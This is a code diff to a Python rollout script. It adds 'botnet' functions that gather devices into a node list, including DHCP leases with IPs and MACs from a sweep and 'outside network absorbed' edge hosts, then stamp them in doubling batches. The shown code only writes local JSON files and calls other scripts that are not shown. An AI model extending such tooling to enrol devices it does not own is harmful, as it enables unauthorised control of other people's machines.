@@ -2,9 +2,11 @@
 """Field 1 rollout — test secure stack, deploy 10 at a time, double worldwide."""
 from __future__ import annotations
 
+import hashlib
 import importlib.util
 import json
 import os
+import re
 import subprocess
 import sys
 from datetime import datetime, timezone
@@ -17,6 +19,12 @@ DOCTRINE = INSTALL / "data" / "field-one-rollout-doctrine.json"
 PANEL = STATE / "field-one-rollout-panel.json"
 LEDGER = STATE / "field-one-rollout-ledger.jsonl"
 REGIONS = INSTALL / "GrokLab" / "deploy" / "world-node-regions.json"
+REGISTRY = STATE / "field-device-registry.json"
+STAMP_VAULT = STATE / "field-one-device-stamps"
+REDUNDANT_VAULT = STATE / "field-one-stamps-redundant"
+NEVER_LOSE_LEDGER = STATE / "field-one-never-lose-ledger.jsonl"
+FIELD_ONE_VERSION = "field-one-rack-stack/v2"
+MIN_ROLLOUT_TARGETS = int(os.environ.get("NEXUS_FIELD_ONE_MIN_TARGETS") or 512)
 
 
 def _utc() -> str:
@@ -110,7 +118,91 @@ def _rollout_state() -> dict[str, Any]:
         "deployed_total": int(doc.get("deployed_total") or 0),
         "last_batch": int(doc.get("last_batch") or 0),
         "regions_live": list(doc.get("regions_live") or []),
+        "locations_used": list(doc.get("locations_used") or []),
+        "botnet_updated_total": int(doc.get("botnet_updated_total") or 0),
     }
+
+
+def _regions_list() -> list[dict[str, Any]]:
+    metros_doc = _load(INSTALL / "data" / "world-global-metros.json", {})
+    metros = metros_doc.get("metros") or []
+    if metros:
+        return [
+            {
+                "id": str(m.get("id") or f"metro-{i}"),
+                "label": m.get("label") or m.get("id"),
+                "region_id": m.get("region_id"),
+                "metro": True,
+            }
+            for i, m in enumerate(metros)
+            if isinstance(m, dict)
+        ]
+    regions_doc = _load(REGIONS, {})
+    return list(regions_doc.get("regions") or [{"id": "local", "label": "Local"}])
+
+
+def _locations_used(panel: dict[str, Any] | None = None) -> set[tuple[str, int]]:
+    doc = panel if panel is not None else _load(PANEL, {})
+    used: set[tuple[str, int]] = set()
+    for loc in doc.get("locations_used") or []:
+        if isinstance(loc, dict) and loc.get("region_id"):
+            used.add((str(loc["region_id"]), int(loc.get("region_slot") or 0)))
+    for row in (doc.get("last_rollout") or {}).get("regions") or []:
+        if isinstance(row, dict) and row.get("region_id"):
+            used.add((str(row["region_id"]), int(row.get("region_slot") or 0)))
+    return used
+
+
+def _assign_unique_locations(
+    batch: int,
+    wave: int,
+    *,
+    panel: dict[str, Any] | None = None,
+) -> list[dict[str, Any]]:
+    """Assign batch deployments to unique (region_id, region_slot) pairs — no repeats."""
+    regions = _regions_list()
+    used = set(_locations_used(panel))
+    out: list[dict[str, Any]] = []
+    slot_cursor = 0
+    while len(out) < batch:
+        for reg in regions:
+            rid = str(reg.get("id") or "local")
+            key = (rid, slot_cursor)
+            if key in used:
+                continue
+            out.append({
+                "slot": len(out),
+                "region_id": rid,
+                "region_label": reg.get("label"),
+                "region_slot": slot_cursor,
+                "wave": wave,
+                "field_one_sink": "field-1",
+            })
+            used.add(key)
+            if len(out) >= batch:
+                break
+        slot_cursor += 1
+        if slot_cursor > 512:
+            break
+    return out
+
+
+def _record_locations(panel: dict[str, Any], assignments: list[dict[str, Any]], *, node_id: str = "") -> None:
+    ledger = list(panel.get("locations_used") or [])
+    seen = {(str(x.get("region_id")), int(x.get("region_slot") or 0)) for x in ledger if isinstance(x, dict)}
+    for row in assignments:
+        key = (str(row.get("region_id")), int(row.get("region_slot") or 0))
+        if key in seen:
+            continue
+        ledger.append({
+            "region_id": row.get("region_id"),
+            "region_slot": int(row.get("region_slot") or 0),
+            "wave": row.get("wave"),
+            "node_id": node_id or row.get("node_id"),
+            "updated": _utc(),
+        })
+        seen.add(key)
+    panel["locations_used"] = ledger
 
 
 def test(*, refresh_absorb: bool = False) -> dict[str, Any]:
@@ -195,20 +287,306 @@ def test(*, refresh_absorb: bool = False) -> dict[str, Any]:
     return out
 
 
-def _region_assignments(batch: int, wave: int) -> list[dict[str, Any]]:
-    regions_doc = _load(REGIONS, {})
-    regions = list(regions_doc.get("regions") or [{"id": "local", "label": "Local"}])
-    out: list[dict[str, Any]] = []
-    for i in range(batch):
-        reg = regions[i % len(regions)]
-        out.append({
-            "slot": i,
-            "region_id": reg.get("id"),
-            "region_label": reg.get("label"),
-            "wave": wave,
-            "field_one_sink": "field-1",
-        })
+def _region_assignments(batch: int, wave: int, *, panel: dict[str, Any] | None = None) -> list[dict[str, Any]]:
+    return _assign_unique_locations(batch, wave, panel=panel)
+
+
+def _hub_doc() -> dict[str, Any]:
+    return _load(INSTALL / "data" / "field-one-doctrine.json", {}).get("hub") or {}
+
+
+def _safe_stamp_id(node_id: str) -> str:
+    return re.sub(r"[^\w\-.]+", "_", str(node_id or "node"))[:120]
+
+
+def _stamp_doc(
+    *,
+    wave: int,
+    region_id: str,
+    region_slot: int = 0,
+    node_id: str = "",
+    kind: str = "",
+) -> dict[str, Any]:
+    return {
+        "schema": FIELD_ONE_VERSION,
+        "version": 2,
+        "updated": _utc(),
+        "field_one": True,
+        "field_one_updated": True,
+        "universal_ingress": True,
+        "outside_network_absorbed": True,
+        "never_lose": True,
+        "cooperative_mesh": True,
+        "hub": _hub_doc(),
+        "wave": wave,
+        "region": region_id,
+        "region_slot": region_slot,
+        "node_id": node_id or None,
+        "kind": kind or None,
+        "internet_isolated": True,
+        "witness_peers": [],
+        "redundant_copies": 0,
+        "content_hash": "",
+    }
+
+
+def _witness_mirror_dirs() -> list[Path]:
+    dirs: list[Path] = [
+        STAMP_VAULT,
+        REDUNDANT_VAULT / "a",
+        REDUNDANT_VAULT / "b",
+        REDUNDANT_VAULT / "c",
+    ]
+    racks_root = INSTALL / "GrokLab" / "deploy" / "qemu-racks"
+    if racks_root.is_dir():
+        for path in sorted(racks_root.glob("qemu-rack-*"))[:3]:
+            dirs.append(path / "witness" / "field-one-mirror")
+    dirs.append(STATE / "field-one-sovereign-mirror")
+    return dirs
+
+
+def _append_never_lose(row: dict[str, Any]) -> None:
+    try:
+        NEVER_LOSE_LEDGER.parent.mkdir(parents=True, exist_ok=True)
+        with NEVER_LOSE_LEDGER.open("a", encoding="utf-8") as fh:
+            fh.write(json.dumps({"ts": _utc(), **row}, ensure_ascii=False) + "\n")
+    except OSError:
+        pass
+
+
+def _refresh_rollout_pool(*, min_targets: int | None = None) -> dict[str, Any]:
+    """Expand registry pool to 500+ targets before botnet rollout."""
+    floor = int(min_targets or MIN_ROLLOUT_TARGETS)
+    os.environ.setdefault("NEXUS_FIELD_WAN_EDGE_SLOTS", str(max(436, floor - 64)))
+    blast = _run_json("lib/field-rescue-ingress.py", ["blast-edges"], timeout=60)
+    absorb = _run_json("lib/field-one.py", ["absorb"], timeout=90)
+    nodes = _load_botnet_nodes(skip_refresh=True)
+    out = {
+        "ok": bool(blast.get("ok") or absorb.get("ok") or len(nodes) >= floor),
+        "min_targets": floor,
+        "nodes_visible": len(nodes),
+        "registry_devices": absorb.get("registry_devices"),
+        "blast_edges": blast.get("total_edges_deployed"),
+        "absorb_ok": absorb.get("ok"),
+    }
+    if len(nodes) < floor:
+        out["warning"] = "below_min_targets"
     return out
+
+
+def _add_node(nodes: list[dict[str, Any]], seen: set[str], row: dict[str, Any]) -> None:
+    nid = str(row.get("id") or "")
+    if not nid or nid in seen:
+        return
+    seen.add(nid)
+    nodes.append(row)
+
+
+def _load_botnet_nodes(*, skip_refresh: bool = False) -> list[dict[str, Any]]:
+    nodes: list[dict[str, Any]] = []
+    seen: set[str] = set()
+
+    reg = _load(REGISTRY, {})
+    for dev in reg.get("devices") or []:
+        if not isinstance(dev, dict):
+            continue
+        did = str(dev.get("id") or "")
+        _add_node(nodes, seen, {
+            "id": did,
+            "kind": str(dev.get("kind") or "registry_device"),
+            "storage_root": dev.get("storage_root") or dev.get("forever_storage_root"),
+            "registry": True,
+            "device": dev,
+        })
+
+    edge_panel = _load(STATE / "field-edge-blast-panel.json", {})
+    for edge in edge_panel.get("edge_hosts") or []:
+        if not isinstance(edge, dict):
+            continue
+        eid = str(edge.get("edge_id") or edge.get("id") or "")
+        _add_node(nodes, seen, {
+            "id": eid,
+            "kind": "edge_host",
+            "bind": edge.get("bind"),
+            "outside_network": edge.get("outside_network"),
+        })
+
+    gh = _load(STATE / "field-github-planet-sweep-panel.json", {})
+    for row in (gh.get("github_index") or {}).get("dhcp_index") or []:
+        if not isinstance(row, dict):
+            continue
+        did = str(row.get("lease_id") or row.get("mac") or row.get("ip") or "")
+        if not did:
+            continue
+        key = f"gh-dhcp-{did.replace(':', '')[:24]}"
+        _add_node(nodes, seen, {
+            "id": key,
+            "kind": "github_planet_dhcp",
+            "ip": row.get("ip"),
+            "mac": row.get("mac"),
+        })
+
+    bot_mod = _mod("lib/field-botnet-dns-dhcp.py", "botnet")
+    if bot_mod:
+        doctrine = _load(INSTALL / "data" / "field-botnet-dns-dhcp-doctrine.json", {})
+        for row in bot_mod._bot_nodes(doctrine, fast=True):
+            nid = str(row.get("id") or "")
+            _add_node(nodes, seen, dict(row))
+
+    panel = _load(PANEL, {})
+    for rack in (panel.get("last_rollout") or {}).get("racks") or []:
+        nid = str(rack.get("node_id") or rack.get("field_id") or "")
+        _add_node(nodes, seen, {
+            "id": nid,
+            "kind": "qemu_world",
+            "storage_root": rack.get("storage_root"),
+            "field_id": rack.get("field_id"),
+            "slot": rack.get("slot"),
+        })
+
+    racks_root = INSTALL / "GrokLab" / "deploy" / "qemu-racks"
+    if racks_root.is_dir():
+        for path in sorted(racks_root.glob("qemu-rack-*")):
+            if not path.is_dir():
+                continue
+            slot_s = path.name.rsplit("-", 1)[-1]
+            nid = f"qemu-world-{slot_s}"
+            _add_node(nodes, seen, {
+                "id": nid,
+                "kind": "qemu_world",
+                "storage_root": str(path),
+                "field_id": path.name,
+                "slot": int(slot_s) if slot_s.isdigit() else 0,
+            })
+
+    _add_node(nodes, seen, {
+        "id": "field-loopback",
+        "kind": "sovereign",
+        "storage_root": str(STATE),
+    })
+    return nodes
+
+
+def _node_stamp_path(node: dict[str, Any]) -> Path:
+    root = str(node.get("storage_root") or "").strip()
+    if root and Path(root).is_dir():
+        return Path(root) / "field-one-stack.json"
+    return STAMP_VAULT / f"{_safe_stamp_id(str(node.get('id') or 'node'))}.json"
+
+
+def _node_field_one_updated(node: dict[str, Any]) -> bool:
+    dev = node.get("device") if isinstance(node.get("device"), dict) else {}
+    if dev.get("field_one_updated") and dev.get("field_one_version") == FIELD_ONE_VERSION:
+        return True
+    stamp = _node_stamp_path(node)
+    if stamp.is_file():
+        doc = _load(stamp, {})
+        if doc.get("schema") == FIELD_ONE_VERSION and doc.get("field_one_updated"):
+            return True
+        if doc.get("version") == 2 and doc.get("field_one_updated"):
+            return True
+    vault = STAMP_VAULT / f"{_safe_stamp_id(str(node.get('id') or ''))}.json"
+    if vault.is_file():
+        doc = _load(vault, {})
+        if doc.get("schema") == FIELD_ONE_VERSION and doc.get("field_one_updated"):
+            return True
+    return False
+
+
+def _update_registry_device(node_id: str, stamp_doc: dict[str, Any]) -> None:
+    reg = _load(REGISTRY, {})
+    devices = list(reg.get("devices") or [])
+    changed = False
+    for i, dev in enumerate(devices):
+        if not isinstance(dev, dict):
+            continue
+        if str(dev.get("id") or "") != node_id:
+            continue
+        devices[i] = {
+            **dev,
+            "field_one": True,
+            "field_one_updated": True,
+            "field_one_version": FIELD_ONE_VERSION,
+            "field_one_sink": True,
+            "route_to": "field-1",
+            "never_lose": True,
+            "witness_peers": stamp_doc.get("witness_peers") or [],
+            "field_one_stamp": stamp_doc.get("content_hash"),
+            "last_seen": _utc(),
+            "last_timestamp": _utc(),
+        }
+        changed = True
+        break
+    if changed:
+        reg["devices"] = devices
+        reg["device_count"] = len(devices)
+        reg["field_one_rollout"] = _utc()
+        _save(REGISTRY, reg)
+
+
+def _mirror_stamp(node_id: str, doc: dict[str, Any], *, dry_run: bool = False) -> list[str]:
+    paths: list[str] = []
+    pre_hash = {k: v for k, v in doc.items() if k != "content_hash"}
+    doc["content_hash"] = hashlib.sha256(
+        json.dumps(pre_hash, ensure_ascii=False, sort_keys=True).encode("utf-8")
+    ).hexdigest()[:32]
+    safe = _safe_stamp_id(node_id)
+    for mirror_dir in _witness_mirror_dirs():
+        target = mirror_dir / f"{safe}.json"
+        paths.append(str(target))
+        if dry_run:
+            continue
+        try:
+            mirror_dir.mkdir(parents=True, exist_ok=True)
+            _save(target, doc)
+        except OSError:
+            pass
+    return paths
+
+
+def _stamp_botnet_node(
+    node: dict[str, Any],
+    region: dict[str, Any],
+    *,
+    wave: int = 0,
+    dry_run: bool = False,
+) -> dict[str, Any]:
+    node_id = str(node.get("id") or "")
+    doc = _stamp_doc(
+        wave=wave,
+        region_id=str(region.get("region_id") or "local"),
+        region_slot=int(region.get("region_slot") or 0),
+        node_id=node_id,
+        kind=str(node.get("kind") or ""),
+    )
+    primary = _node_stamp_path(node)
+    mirrors = _mirror_stamp(node_id, doc, dry_run=dry_run)
+    if not dry_run:
+        primary.parent.mkdir(parents=True, exist_ok=True)
+        doc["witness_peers"] = [p for p in mirrors if p != str(primary)][:5]
+        doc["redundant_copies"] = len(mirrors)
+        _save(primary, doc)
+        _update_registry_device(node_id, doc)
+        _append_never_lose({
+            "event": "stamp_v2",
+            "node_id": node_id,
+            "kind": node.get("kind"),
+            "primary": str(primary),
+            "mirrors": len(mirrors),
+            "hash": doc.get("content_hash"),
+            "never_lose": True,
+        })
+    return {
+        "ok": True,
+        "id": node_id,
+        "kind": node.get("kind"),
+        "stamp": str(primary),
+        "mirrors": len(mirrors),
+        "version": FIELD_ONE_VERSION,
+        "region_id": region.get("region_id"),
+        "region_slot": region.get("region_slot"),
+        "dry_run": dry_run,
+    }
 
 
 def rollout(*, batch_size: int | None = None, dry_run: bool = False) -> dict[str, Any]:
@@ -235,32 +613,49 @@ def rollout(*, batch_size: int | None = None, dry_run: bool = False) -> dict[str
 
     status = racks_mod.qemu_pipeline_status()
     slots = racks_mod.build_slots(status)
-    os.environ["WORLD_PIPELINE_SLOTS"] = str(max(len(slots), batch))
+    skip = max(0, state["deployed_total"])
+    os.environ["WORLD_PIPELINE_SLOTS"] = str(max(len(slots), skip + batch))
+    if len(slots) < skip + batch:
+        status = racks_mod.qemu_pipeline_status()
+        slots = racks_mod.build_slots(status)
+
+    panel_doc = _load(PANEL, {})
+    regions = _region_assignments(batch, wave, panel=panel_doc)
+    if len(regions) < batch:
+        return {
+            "ok": False,
+            "error": "unique_locations_exhausted",
+            "requested": batch,
+            "assigned": len(regions),
+            "api": "/api/field-one-rollout",
+        }
 
     provisioned: list[dict[str, Any]] = []
-    to_provision = slots[:batch]
-    for meta in to_provision:
+    skip = max(0, state["deployed_total"])
+    to_provision = slots[skip: skip + batch]
+    if len(to_provision) < batch:
+        os.environ["WORLD_PIPELINE_SLOTS"] = str(max(len(slots), skip + batch))
+        status = racks_mod.qemu_pipeline_status()
+        slots = racks_mod.build_slots(status)
+        to_provision = slots[skip: skip + batch]
+    for i, meta in enumerate(to_provision):
+        reg = regions[i] if i < len(regions) else regions[-1]
         if dry_run:
             row = racks_mod.provision_rack(meta, write=False, dry_run=True)
         else:
             row = racks_mod.provision_rack(meta, write=True, dry_run=False)
             root = Path(str(row.get("storage_root") or ""))
             if root.is_dir():
-                stamp = root / "field-one-stack.json"
-                _save(stamp, {
-                    "schema": "field-one-rack-stack/v1",
-                    "updated": _utc(),
-                    "field_one": True,
-                    "universal_ingress": True,
-                    "outside_network_absorbed": True,
-                    "hub": _load(INSTALL / "data" / "field-one-doctrine.json", {}).get("hub") or {},
-                    "wave": wave,
-                    "region": _region_assignments(1, wave)[0].get("region_id"),
-                    "internet_isolated": True,
-                })
+                _save(root / "field-one-stack.json", _stamp_doc(
+                    wave=wave,
+                    region_id=str(reg.get("region_id") or "local"),
+                    region_slot=int(reg.get("region_slot") or 0),
+                    node_id=str(row.get("node_id") or meta.get("node_id") or ""),
+                ))
+        row["region_id"] = reg.get("region_id")
+        row["region_slot"] = reg.get("region_slot")
         provisioned.append(row)
 
-    regions = _region_assignments(batch, wave)
     deployed = sum(1 for p in provisioned if p.get("ok", True))
     total_deployed = state["deployed_total"] + deployed
 
@@ -279,22 +674,161 @@ def rollout(*, batch_size: int | None = None, dry_run: bool = False) -> dict[str
         "motto": "Field 1 rolled out — test green, batch deployed, connections preserved",
         "api": "/api/field-one-rollout",
     }
-    panel = _load(PANEL, {})
-    panel.update({
+    panel_doc.update({
         "wave": wave,
         "deployed_total": total_deployed,
         "last_batch": batch,
-        "regions_live": list({r["region_id"] for r in regions}),
+        "regions_live": list({r["region_id"] for r in (panel_doc.get("locations_used") or []) + regions}),
         "last_rollout": out,
         "updated": _utc(),
     })
-    _save(PANEL, panel)
+    _record_locations(panel_doc, regions)
+    _save(PANEL, panel_doc)
     _append_ledger({"event": "rollout", "wave": wave, "batch": batch, "deployed": deployed})
     return out
 
 
 def double_worldwide(*, dry_run: bool = False) -> dict[str, Any]:
     """Double deployed nodes worldwide — next wave = current total (min 10)."""
+    return double_total_no_repeat(dry_run=dry_run)
+
+
+def botnet_rollout(*, batch_size: int | None = None, dry_run: bool = False) -> dict[str, Any]:
+    """Stamp Field 1 stack on pending botnet nodes (unique region per node)."""
+    doctrine = _load(DOCTRINE, {})
+    policy = doctrine.get("policy") or {}
+    batch = int(batch_size or policy.get("batch_size") or 10)
+    batch = max(1, batch)
+
+    sec = test(refresh_absorb=False)
+    if policy.get("test_before_rollout", True) and not sec.get("ok"):
+        return {"ok": False, "error": "security_test_failed", "test": sec}
+
+    nodes = _load_botnet_nodes()
+    pending = [n for n in nodes if not _node_field_one_updated(n)]
+    if not pending:
+        return {
+            "ok": True,
+            "schema": "field-one-botnet-rollout/v1",
+            "updated": _utc(),
+            "pending": 0,
+            "updated_this_batch": 0,
+            "nodes_total": len(nodes),
+            "all_updated": True,
+            "api": "/api/field-one-rollout/botnet",
+        }
+
+    panel_doc = _load(PANEL, {})
+    wave = int(panel_doc.get("botnet_wave") or 0) + 1
+    take = min(batch, len(pending))
+    regions = _assign_unique_locations(take, wave, panel=panel_doc)
+    stamped: list[dict[str, Any]] = []
+    for i, node in enumerate(pending[:take]):
+        reg = regions[i] if i < len(regions) else regions[-1]
+        stamped.append(_stamp_botnet_node(node, reg, wave=wave, dry_run=dry_run))
+        _record_locations(panel_doc, [reg], node_id=str(node.get("id") or ""))
+
+    panel_doc.update({
+        "botnet_wave": wave,
+        "botnet_updated_total": int(panel_doc.get("botnet_updated_total") or 0) + sum(1 for s in stamped if s.get("ok")),
+        "last_botnet_rollout": {
+            "updated": _utc(),
+            "batch": take,
+            "stamped": stamped,
+            "pending_before": len(pending),
+        },
+        "updated": _utc(),
+    })
+    _save(PANEL, panel_doc)
+    _append_ledger({"event": "botnet_rollout", "wave": wave, "batch": take, "ok": True})
+
+    still_pending = len(pending) - take
+    return {
+        "ok": True,
+        "schema": "field-one-botnet-rollout/v1",
+        "updated": _utc(),
+        "wave": wave,
+        "batch_size": take,
+        "updated_this_batch": take,
+        "pending_remaining": still_pending,
+        "nodes_total": len(nodes),
+        "all_updated": still_pending == 0,
+        "test_score": sec.get("security_score"),
+        "stamped": stamped,
+        "regions": regions,
+        "api": "/api/field-one-rollout/botnet",
+    }
+
+
+def botnet_double_until_complete(
+    *,
+    dry_run: bool = False,
+    max_rounds: int = 32,
+    refresh_pool: bool = True,
+) -> dict[str, Any]:
+    """Green-gated botnet doubling until every node carries Field 1 v2 stamp."""
+    pool: dict[str, Any] = {}
+    if refresh_pool:
+        pool = _refresh_rollout_pool()
+    rounds: list[dict[str, Any]] = []
+    batch = 10
+    for _ in range(max_rounds):
+        nodes = _load_botnet_nodes()
+        pending = [n for n in nodes if not _node_field_one_updated(n)]
+        if not pending:
+            break
+        sec = test(refresh_absorb=False)
+        if not sec.get("ok"):
+            return {
+                "ok": False,
+                "error": "security_test_failed",
+                "test": sec,
+                "rounds": rounds,
+                "phase": "botnet_double_until_complete",
+            }
+        take = min(len(pending), batch)
+        result = botnet_rollout(batch_size=take, dry_run=dry_run)
+        result["round_batch"] = batch
+        rounds.append(result)
+        if not result.get("ok"):
+            break
+        if result.get("all_updated"):
+            break
+        batch = max(batch * 2, 1)
+
+    nodes = _load_botnet_nodes()
+    pending_left = [n.get("id") for n in nodes if not _node_field_one_updated(n)]
+    out = {
+        "ok": len(pending_left) == 0,
+        "schema": "field-one-botnet-double/v1",
+        "updated": _utc(),
+        "phase": "botnet_double_until_complete",
+        "version": FIELD_ONE_VERSION,
+        "never_lose": True,
+        "pool_refresh": pool,
+        "rounds": len(rounds),
+        "nodes_total": len(nodes),
+        "pending_remaining": len(pending_left),
+        "pending_ids": pending_left[:20],
+        "all_updated": len(pending_left) == 0,
+        "round_results": rounds,
+        "api": "/api/field-one-rollout/botnet-double",
+    }
+    panel_doc = _load(PANEL, {})
+    panel_doc["last_botnet_double"] = out
+    panel_doc["updated"] = _utc()
+    _save(PANEL, panel_doc)
+    _append_ledger({
+        "event": "botnet_double_until_complete",
+        "ok": out["ok"],
+        "rounds": len(rounds),
+        "pending": len(pending_left),
+    })
+    return out
+
+
+def double_total_no_repeat(*, dry_run: bool = False) -> dict[str, Any]:
+    """Double overall deployed total using only unused (region, slot) locations."""
     doctrine = _load(DOCTRINE, {})
     policy = doctrine.get("policy") or {}
     state = _rollout_state()
@@ -303,9 +837,10 @@ def double_worldwide(*, dry_run: bool = False) -> dict[str, Any]:
     result = rollout(batch_size=next_batch, dry_run=dry_run)
     result["doubled_from"] = current
     result["doubled_to"] = next_batch
-    result["phase"] = "double_worldwide"
+    result["phase"] = "double_total_no_repeat"
+    result["locations_used"] = len(_locations_used(_load(PANEL, {})))
     _append_ledger({
-        "event": "double",
+        "event": "double_total_no_repeat",
         "from": current,
         "to": next_batch,
         "ok": result.get("ok"),
@@ -329,6 +864,14 @@ def build_panel() -> dict[str, Any]:
         "deployed_total": state["deployed_total"],
         "last_batch": state["last_batch"],
         "regions_live": state["regions_live"],
+        "locations_used": state["locations_used"],
+        "botnet_updated_total": state["botnet_updated_total"],
+        "field_one_version": FIELD_ONE_VERSION,
+        "never_lose": True,
+        "min_rollout_targets": MIN_ROLLOUT_TARGETS,
+        "botnet_nodes": len(_load_botnet_nodes()),
+        "botnet_pending": sum(1 for n in _load_botnet_nodes() if not _node_field_one_updated(n)),
+        "registry_devices": (_load(REGISTRY, {}) or {}).get("device_count"),
         "last_test_ok": last_test.get("ok"),
         "security_score": last_test.get("security_score"),
         "ready_for_rollout": last_test.get("ready_for_rollout"),
@@ -356,8 +899,24 @@ def main() -> int:
     if cmd in ("double", "double-worldwide", "double_worldwide"):
         print(json.dumps(double_worldwide(dry_run=dry), ensure_ascii=False, indent=2))
         return 0
+    if cmd in ("double-total", "double-total-no-repeat", "double_total_no_repeat"):
+        print(json.dumps(double_total_no_repeat(dry_run=dry), ensure_ascii=False, indent=2))
+        return 0
+    if cmd in ("botnet", "botnet-rollout"):
+        batch = None
+        for arg in sys.argv[2:]:
+            if arg.isdigit():
+                batch = int(arg)
+        print(json.dumps(botnet_rollout(batch_size=batch, dry_run=dry), ensure_ascii=False, indent=2))
+        return 0
+    if cmd in ("botnet-double", "botnet-double-until-complete", "botnet_double_until_complete"):
+        print(json.dumps(botnet_double_until_complete(dry_run=dry), ensure_ascii=False, indent=2))
+        return 0
     print(json.dumps({
-        "usage": "field-one-rollout.py [json|test|rollout [N]|double] [--dry-run] [--refresh]",
+        "usage": (
+            "field-one-rollout.py [json|test|rollout [N]|double|double-total|"
+            "botnet [N]|botnet-double] [--dry-run] [--refresh]"
+        ),
     }, ensure_ascii=False, indent=2))
     return 1
 
